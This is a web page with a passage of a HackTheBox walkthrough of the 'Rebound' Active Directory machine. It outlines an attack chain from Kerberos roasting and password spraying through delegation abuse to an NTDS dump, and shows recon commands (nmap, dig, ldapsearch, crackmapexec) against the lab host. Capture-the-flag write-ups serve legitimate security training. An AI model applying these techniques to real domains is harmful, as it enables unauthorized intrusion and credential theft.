
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rebound - HTB</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link href="/css/articles.css" rel="stylesheet">
    <link href="/css/styles.css" rel="stylesheet">
    <link href="/css/monokai.css" rel="stylesheet">
    <link href="/css/writeups.css" rel="stylesheet">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <button class="sidebar-toggle" id="sidebarToggle">â˜°</button>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <aside class="sidebar">
                <div class="sidebar-logo">
                    <img src="/img/new-logo.png" alt="Logo">
                    <h3>elswix</h3>
                </div>
                <nav>
                    <ul class="nav flex-column">
                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
                    </ul>
                </nav>
            </aside>
            <!-- Main Content -->
            <main>
                <!-- Hero Section -->
                <section class="hero mb-5">
                    <img alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%" src="/writeups/htb/insane/rebound/img/rebound.png">
                <h2>Rebound - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links" style="display: none">
                    <li><a href="https://app.hackthebox.com/machines/Rebound">HackTheBox</a></li>
                </ul>
            </section>
                <section class="article-content">
                    <div class="article-container">
                        <div class="article-content-main">                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Rebound</span>
<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Insane</span>
<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">09</span><span class="o">/</span><span class="mi">09</span><span class="o">/</span><span class="mi">2023</span>
</pre></div>
<h3>About Rebound</h3><br/>
<p>Rebound is an insane difficulty machine on HackTheBox. Initially, we'll exploit RID brute force to obtain a list of valid users on the Domain Controller. One of these users is vulnerable to ASREPRoastable, however, its password is not crackable.</p><br/>
<h3>Auth as ldap_monitor</h3><br/>
<p>Even though we can't crack the user password, we find a way to combine both ASREPRoast and Kerberoasting Attack to obtain a hash for <code>ldap_monitor</code>. We successfully crack it offline using <code>john</code>.</p><br/>
<h3>Auth as oorend</h3><br/>
<p>By performing password spraying with the password we obtained for <code>ldap_monitor</code>, we notice that <code>oorend</code> has the same password, allowing us to authenticate as them.</p><br/>
<h3>Shell as winrm_svc</h3><br/>
<p>By running <code>bloodhound-python</code> to perform a comprehensive enumeration of the AD environment, we discovered that the <code>ServiceMgmt</code> group has special privileges that could lead to obtaining a shell as <code>winrm_svc</code> following certain steps. However, none of our users are members of <code>ServiceMgmt</code>. Upon inspecting the ACLs of <code>ServiceMgmt</code>, I noticed that <code>oorend</code> can add itself to the <code>ServiceMgmt</code> group, which provides us with an opportunity to follow those steps and ultimately gain access as <code>winrm_svc</code>.</p><br/>
<h3>Auth as tbrady</h3><br/>
<p>nce on the system as <code>winrm_svc</code>, upon inspecting the running processes, we noticed that some processes are running under a different Session ID, indicating that a user is logged in on the box. By running the exploit <code>RemotePotato0</code>, we were able to steal an NTLMv2 hash of <code>tbrady</code>, exploiting the active session. This hash is crackable, and we obtain the plaintext password.</p><br/>
<h3>Auth as delegator$</h3><br/>
<p>As <code>tbrady</code>, we can read the GMSA password of <code>delegator$</code>. Therefore, by using the <code>bloodyAD</code> tool, we obtain the NTLM hash of <code>delegator$</code>. Taking advantage of the PassTheHash technique, we achieve authentication as <code>delegator$</code>.</p><br/>
<h3>Shell as Administrator</h3><br/>
<p>The machine account <code>delegator$</code> has constrained delegation privileges over a service. By configuring RBCD over <code>delegator$</code>, we impersonate the <code>dc01$</code> machine account in <code>delegator$</code>, subsequently leveraging constrained delegation to impersonate the <code>dc01$</code> machine account in <code>dc01</code>. Consequently, we gain access as administrator by dumping the NTDS and using its NTLM hash to get a shell via <code>WinRM</code>.</p><br/>
<h3>Recon</h3><br/>
<p>Initially, let's conduct a port scan to discover open ports on the victim machine. To achieve this, I'll use <code>nmap</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nmap</span> <span class="mf">10.10.11.231</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">oG</span> <span class="n">portScan</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.231</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">53866</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">11643</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>
<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
<span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5</span>
<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">rpc</span><span class="o">-</span><span class="n">epmap</span>
<span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldapssl</span>
<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAP</span>
<span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAPssl</span>
<span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">wsman</span>
<span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">adws</span>
<span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">winrm</span>
<span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49665</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49666</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49671</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49674</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49675</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49676</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49681</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49688</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49734</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">51101</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</pre></div>
<p>Once the scan is complete, we'll launch a comprehensive scan to identify technologies running on these ports. To do so, firstly I'll extract open ports from the output file.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">portScan</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">oP</span> <span class="s1">'\d{1,5}/open'</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">'{print $1}'</span> <span class="n">FS</span><span class="o">=</span><span class="s2">"/"</span> <span class="o">|</span> <span class="n">xargs</span> <span class="o">|</span> <span class="n">tr</span> <span class="s1">' '</span> <span class="s1">','</span>
<span class="mi">53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">47001</span><span class="p">,</span><span class="mi">49664</span><span class="p">,</span><span class="mi">49665</span><span class="p">,</span><span class="mi">49666</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49671</span><span class="p">,</span><span class="mi">49674</span><span class="p">,</span><span class="mi">49675</span><span class="p">,</span><span class="mi">49676</span><span class="p">,</span><span class="mi">49681</span><span class="p">,</span><span class="mi">49688</span><span class="p">,</span><span class="mi">49734</span><span class="p">,</span><span class="mi">51101</span>
</pre></div>
<p>Now, I'll use <code>nmap</code> to perform the scan:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">47001</span><span class="p">,</span><span class="mi">49664</span><span class="p">,</span><span class="mi">49665</span><span class="p">,</span><span class="mi">49666</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49671</span><span class="p">,</span><span class="mi">49674</span><span class="p">,</span><span class="mi">49675</span><span class="p">,</span><span class="mi">49676</span><span class="p">,</span><span class="mi">49681</span><span class="p">,</span><span class="mi">49688</span><span class="p">,</span><span class="mi">49734</span><span class="p">,</span><span class="mi">51101</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.231</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.32</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>

<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>       <span class="n">VERSION</span>
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>        <span class="n">Simple</span> <span class="n">DNS</span> <span class="n">Plus</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>  <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Kerberos</span> <span class="p">(</span><span class="n">server</span> <span class="n">time</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">29</span> <span class="mi">02</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">33</span><span class="n">Z</span><span class="p">)</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>   <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>          <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Active</span> <span class="n">Directory</span> <span class="n">LDAP</span> <span class="p">(</span><span class="n">Domain</span><span class="p">:</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb0</span><span class="o">.</span><span class="p">,</span> <span class="n">Site</span><span class="p">:</span> <span class="n">Default</span><span class="o">-</span><span class="n">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">29</span><span class="n">T02</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">45</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">7</span><span class="n">h19m20s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> 
<span class="o">|</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="p">:</span> <span class="n">DNS</span><span class="p">:</span><span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">25</span><span class="n">T22</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">10</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">24</span><span class="n">T22</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">10</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="err">?</span>
<span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5</span><span class="err">?</span>
<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span> <span class="n">over</span> <span class="n">HTTP</span> <span class="mf">1.0</span>
<span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">ldap</span>      <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Active</span> <span class="n">Directory</span> <span class="n">LDAP</span> <span class="p">(</span><span class="n">Domain</span><span class="p">:</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb0</span><span class="o">.</span><span class="p">,</span> <span class="n">Site</span><span class="p">:</span> <span class="n">Default</span><span class="o">-</span><span class="n">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">29</span><span class="n">T02</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">46</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">7</span><span class="n">h19m20s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> 
<span class="o">|</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="p">:</span> <span class="n">DNS</span><span class="p">:</span><span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
</pre></div>
<p>Notice that I have saved the output to a file; you should always do this on every scan!</p><br/>
<p>At first glance, in the output, we can highlight a domain and the SAN. I'll add them to my <code>hosts</code> file.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>   <span class="n">hackency</span>

<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
<span class="p">::</span><span class="mi">1</span>     <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">fe00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localnet</span>
<span class="n">ff00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">mcastprefix</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="mf">10.10.11.231</span> <span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
</pre></div>
<h3>DNS Enumeration</h3><br/>
<p>Since port 53 is open, we could conduct some <strong>DNS enumeration</strong>. Firstly, with <code>dig</code>, I'll perform some DNS queries.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">dig</span> <span class="o">@</span><span class="mf">10.10.11.231</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="n">ns</span>

<span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">DiG</span> <span class="mf">9.18.18</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu0</span><span class="mf">.22.04.2</span><span class="o">-</span><span class="n">Ubuntu</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="o">@</span><span class="mf">10.10.11.231</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="n">ns</span>
<span class="p">;</span> <span class="p">(</span><span class="mi">1</span> <span class="n">server</span> <span class="n">found</span><span class="p">)</span>
<span class="p">;;</span> <span class="k">global</span> <span class="n">options</span><span class="p">:</span> <span class="o">+</span><span class="n">cmd</span>
<span class="p">;;</span> <span class="n">Got</span> <span class="n">answer</span><span class="p">:</span>
<span class="p">;;</span> <span class="o">-&gt;&gt;</span><span class="n">HEADER</span><span class="o">&lt;&lt;-</span> <span class="n">opcode</span><span class="p">:</span> <span class="n">QUERY</span><span class="p">,</span> <span class="n">status</span><span class="p">:</span> <span class="n">NOERROR</span><span class="p">,</span> <span class="nb">id</span><span class="p">:</span> <span class="mi">20361</span>
<span class="p">;;</span> <span class="n">flags</span><span class="p">:</span> <span class="n">qr</span> <span class="n">aa</span> <span class="n">rd</span> <span class="n">ra</span><span class="p">;</span> <span class="n">QUERY</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">ANSWER</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">AUTHORITY</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ADDITIONAL</span><span class="p">:</span> <span class="mi">2</span>

<span class="p">;;</span> <span class="n">OPT</span> <span class="n">PSEUDOSECTION</span><span class="p">:</span>
<span class="p">;</span> <span class="n">EDNS</span><span class="p">:</span> <span class="n">version</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">flags</span><span class="p">:;</span> <span class="n">udp</span><span class="p">:</span> <span class="mi">4000</span>
<span class="p">;;</span> <span class="n">QUESTION</span> <span class="n">SECTION</span><span class="p">:</span>
<span class="p">;</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span>            <span class="n">IN</span>   <span class="n">NS</span>

<span class="p">;;</span> <span class="n">ANSWER</span> <span class="n">SECTION</span><span class="p">:</span>
<span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span>        <span class="mi">3600</span>    <span class="n">IN</span>   <span class="n">NS</span>   <span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span>

<span class="p">;;</span> <span class="n">ADDITIONAL</span> <span class="n">SECTION</span><span class="p">:</span>
<span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span> <span class="mi">3600</span>    <span class="n">IN</span>   <span class="n">A</span>    <span class="mf">10.10.11.231</span>

<span class="p">;;</span> <span class="n">Query</span> <span class="n">time</span><span class="p">:</span> <span class="mi">204</span> <span class="n">msec</span>
<span class="p">;;</span> <span class="n">SERVER</span><span class="p">:</span> <span class="mf">10.10.11.231</span><span class="c1">#53(10.10.11.231) (UDP)</span>
<span class="p">;;</span> <span class="n">WHEN</span><span class="p">:</span> <span class="n">Thu</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">00</span> <span class="o">-</span><span class="mi">03</span> <span class="mi">2024</span>
<span class="p">;;</span> <span class="n">MSG</span> <span class="n">SIZE</span>  <span class="n">rcvd</span><span class="p">:</span> <span class="mi">75</span>
</pre></div>
<p>It didn't retrieve any relevant information.</p><br/>
<h3>Transfer Zone Attack (Failed)</h3><br/>
<p>Sometimes, misconfigured DNS services can be vulnerable to the <strong>Zone Transfer</strong> attack, the success of which could leak all registered subdomains.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">dig</span> <span class="o">@</span><span class="mf">10.10.11.231</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="n">axfr</span>

<span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">DiG</span> <span class="mf">9.18.18</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu0</span><span class="mf">.22.04.2</span><span class="o">-</span><span class="n">Ubuntu</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="o">@</span><span class="mf">10.10.11.231</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="n">axfr</span>
<span class="p">;</span> <span class="p">(</span><span class="mi">1</span> <span class="n">server</span> <span class="n">found</span><span class="p">)</span>
<span class="p">;;</span> <span class="k">global</span> <span class="n">options</span><span class="p">:</span> <span class="o">+</span><span class="n">cmd</span>
<span class="p">;</span> <span class="n">Transfer</span> <span class="n">failed</span><span class="o">.</span>
</pre></div>
<p>It didn't work, but it's worth checking out anyway.</p><br/>
<h3>LDAP - Port 389/636</h3><br/>
<p>Even if we lack valid credentials against the domain, we could still perform some anonymous (public) enumeration.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ldapsearch</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">H</span> <span class="n">ldap</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">b</span> <span class="s1">'DC=rebound,DC=htb'</span>
<span class="c1"># extended LDIF</span>
<span class="c1">#</span>
<span class="c1"># LDAPv3</span>
<span class="c1"># base &lt;DC=rebound,DC=htb&gt; with scope subtree</span>
<span class="c1"># filter: (objectclass=*)</span>
<span class="c1"># requesting: ALL</span>
<span class="c1">#</span>

<span class="c1"># search result</span>
<span class="n">search</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">result</span><span class="p">:</span> <span class="mi">1</span> <span class="n">Operations</span> <span class="n">error</span>
<span class="n">text</span><span class="p">:</span> <span class="mi">000004</span><span class="n">DC</span><span class="p">:</span> <span class="n">LdapErr</span><span class="p">:</span> <span class="n">DSID</span><span class="o">-</span><span class="mi">0</span><span class="n">C090ACD</span><span class="p">,</span> <span class="n">comment</span><span class="p">:</span> <span class="n">In</span> <span class="n">order</span> <span class="n">to</span> <span class="n">perform</span> <span class="n">this</span> <span class="n">opera</span>
 <span class="n">tion</span> <span class="n">a</span> <span class="n">successful</span> <span class="n">bind</span> <span class="n">must</span> <span class="n">be</span> <span class="n">completed</span> <span class="n">on</span> <span class="n">the</span> <span class="n">connection</span><span class="o">.</span><span class="p">,</span> <span class="n">data</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v4563</span>

<span class="c1"># numResponses: 1</span>
</pre></div>
<p>Given the error returned, I realized that we need valid credentials to enumerate the LDAP service.</p><br/>
<h3>SMB - Port 445</h3><br/>
<p>As the SMB service is exposed, we could carry out some system enumeration. I'll use <code>crackmapexec</code> for this purpose.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
</pre></div>
<p>Let's try to list all the network-level shared resources:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span> <span class="o">--</span><span class="n">shares</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Error</span> <span class="n">getting</span> <span class="n">user</span><span class="p">:</span> <span class="nb">list</span> <span class="n">index</span> <span class="n">out</span> <span class="n">of</span> <span class="nb">range</span>
